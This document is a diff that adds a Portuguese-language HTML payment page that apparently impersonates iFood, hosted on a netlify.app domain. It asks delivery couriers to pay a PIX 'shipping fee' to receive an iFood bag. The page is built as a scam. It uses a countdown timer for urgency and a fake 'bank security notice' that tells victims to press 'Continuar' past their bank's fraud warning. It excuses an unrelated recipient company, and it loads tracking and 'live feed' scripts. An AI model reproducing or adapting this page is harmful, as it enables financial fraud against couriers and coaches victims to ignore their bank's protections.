@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="theme-color" content="#EA1D2C">
+  <title>iFood Entregador - Pagamento PIX</title>
+  <meta name="description" content="Pague o frete via PIX para confirmar o envio do seu item iFood.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body data-page="pix">
+
+  <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>
+
+  <main class="container">
+    <section class="step pix-page" aria-hidden="false">
+      <div class="pix-topbar">
+        <div class="pix-topbar__title">Pagamento</div>
+      </div>
+
+      <div class="pix-hero">
+        <img
+          src="https://resgate-sua-bag.netlify.app/assets/pix-photo.webp"
+          alt="Pagamento via Pix"
+          loading="eager"
+          onerror="this.style.display='none'"
+        >
+      </div>
+
+      <h2 class="pix-heading">Pedido aguardando pagamento</h2>
+      <p class="pix-instructions">
+        Copie o código abaixo e utilize a opção Pix Copia e Cola no aplicativo do seu banco:
+      </p>
+
+      <aside class="pix-security-notice" aria-labelledby="pix-security-title">
+        <div class="pix-security-notice__icon" aria-hidden="true">🛡️</div>
+        <div class="pix-security-notice__content">
+          <h3 id="pix-security-title">Aviso de segurança do seu banco</h3>
+          <p>
+            Ao confirmar o Pix, seu banco poderá exibir uma mensagem preventiva de segurança.
+            Esse é um procedimento de proteção adotado pelo próprio banco. Quando o aplicativo
+            disponibilizar o botão <strong>Continuar</strong>, você poderá avançar para revisar
+            e confirmar a transação.
+          </p>
+          <p class="pix-security-notice__check">
+            A identificação <strong class="pix-security-notice__provider">BRASIL COMPRAS ONLINE LTDA</strong>
+            poderá aparecer na descrição da intermediadora do pagamento. Antes de confirmar,
+            confira se o <strong>nome ou a razão social do recebedor</strong>, o
+            <strong>CPF/CNPJ</strong>, a <strong>instituição</strong> e o <strong>valor</strong>
+            correspondem aos dados oficiais da cobrança.
+          </p>
+        </div>
+      </aside>
+
+      <div id="pix-card" class="pix-card pix-card--flat">
+        <div class="pix-copy-box">
+          <input id="pix-code" class="pix-copy-input" type="text" readonly value="">
+          <button id="btn-copy-pix-icon" class="pix-copy-icon" type="button" aria-label="Copiar codigo">📋</button>
+        </div>
+
+        <div class="pix-timer">
+          <span class="pix-timer-label">O tempo para voce pagar acaba em:</span>
+          <div id="pix-timer" class="pix-timer-value">10:00</div>
+          <div class="pix-progress">
+            <div id="pix-progress-bar" class="pix-progress-bar"></div>
+          </div>
+        </div>
+
+        <button id="btn-copy-pix" class="btn-primary pix-copy-btn" type="button">Copiar codigo</button>
+        <button id="btn-show-pix-qr" class="btn-secondary pix-qr-toggle-btn" type="button">Pagar com QRcode</button>
+
+        <div id="pix-qr-section" class="pix-inline-qr hidden" aria-hidden="true">
+          <p class="pix-inline-qr__label">Escaneie o QR Code abaixo para pagar este PIX.</p>
+          <div class="pix-inline-qr__wrap">
+            <canvas id="pix-qr-canvas" class="pix-inline-qr__image" aria-label="QR Code PIX"></canvas>
+          </div>
+        </div>
+
+        <div class="pix-order-card">
+          <div class="pix-order-head">
+            <div class="pix-order-avatar">
+              <img
+                id="pix-order-image"
+                src="https://resgate-sua-bag.netlify.app/assets/bagfoto.webp"
+                alt="Bag iFood"
+              >
+            </div>
+            <div>
+              <div id="pix-order-title" class="pix-order-title">Bag do iFood</div>
+              <div class="pix-order-sub">N do pedido <span id="pix-order-id">-</span></div>
+            </div>
+          </div>
+          <div class="pix-order-total">
+            <span>Total no PIX</span>
+            <strong id="pix-amount">R$ 0,00</strong>
+          </div>
+        </div>
+
+        <div class="pix-status-line">
+          Status: <strong id="pix-status">Aguardando pagamento</strong>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>
+
+  <footer class="footer">
+    <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
+  </footer>
+
+  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.4/build/qrcode.min.js" defer></script>
+  <script src="bravopay-config.js" defer></script>
+  <script src="script-utms.js" defer></script>
+  <script src="script-pix.js" defer></script>
+  <script src="script-live-feed.js" defer></script>
+</body>
+</html>
